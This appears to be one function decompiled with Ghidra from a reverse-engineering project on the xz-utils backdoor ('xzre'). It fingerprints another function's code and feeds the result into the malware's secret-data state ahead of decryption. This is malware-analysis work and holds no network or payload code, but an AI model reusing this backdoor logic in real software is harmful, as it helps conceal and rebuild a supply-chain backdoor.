// /home/kali/xzre-ghidra/xzregh/10AAC0_secret_data_append_singleton.c
// Function: secret_data_append_singleton @ 0x10AAC0
// Calling convention: unknown
// Prototype: undefined secret_data_append_singleton(void)


/*
 * AutoDoc: Performs a one-off fingerprint of a function: finds its start, validates the instruction stream, shifts the requested number of bits, and marks the operation id as complete. Setup routines call it to attest critical helpers before relying on them for decryption.
 */
#include "xzre_types.h"


undefined8
secret_data_append_singleton
          (long param_1,undefined8 param_2,undefined4 param_3,int param_4,uint param_5)

{
  long lVar1;
  int iVar2;
  undefined8 uVar3;
  void *func_start;
  
  lVar1 = global_ctx;
  func_start = (void *)0x0;
  if ((global_ctx == 0) || (*(char *)(global_ctx + 0x141 + (ulong)param_5) != '\0')) {
LAB_0010ab60:
    uVar3 = 1;
  }
  else {
    *(undefined1 *)(global_ctx + 0x141 + (ulong)param_5) = 1;
    iVar2 = find_function(param_2,&func_start,0,*(undefined8 *)(lVar1 + 0x80),
                          *(undefined8 *)(lVar1 + 0x88),1);
    if (iVar2 != 0) {
      iVar2 = secret_data_append_from_code
                        (func_start,*(undefined8 *)(global_ctx + 0x88),param_3,param_4,param_1 == 0)
      ;
      if (iVar2 != 0) {
        *(int *)(global_ctx + 0x160) = *(int *)(global_ctx + 0x160) + param_4;
        goto LAB_0010ab60;
      }
    }
    uVar3 = 0;
  }
  return uVar3;
}

